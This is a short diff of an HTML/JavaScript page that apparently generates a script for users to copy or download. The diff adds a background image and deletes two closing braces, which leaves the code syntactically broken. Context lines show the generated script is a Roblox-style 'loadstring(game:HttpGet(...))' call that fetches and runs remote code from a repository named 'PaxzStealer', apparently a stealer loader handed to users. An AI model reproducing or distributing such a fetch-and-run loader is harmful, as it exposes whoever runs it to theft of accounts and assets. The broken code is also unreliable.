@@ -10,6 +10,10 @@
       text-align: center;
       margin: 0;
       background-color: #f2f2f2;
+      background-image: url('https://wallpapercave.com/wp/wp2760959.gif');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
     }
 
     .container {
@@ -160,7 +164,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main
 
       scriptCode.textContent = generatedScript;
       scriptOutput.style.display = "block";
-    });
 
     copyScriptBtn.addEventListener("click", () => {
       const scriptText = scriptCode.textContent;
@@ -171,7 +174,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/PaxzStealer/Paxz/main
         .catch((error) => {
           console.error("Copy failed:", error);
         });
-    });
 
     downloadScriptBtn.addEventListener("click", () => {
       const scriptText = scriptCode.textContent;
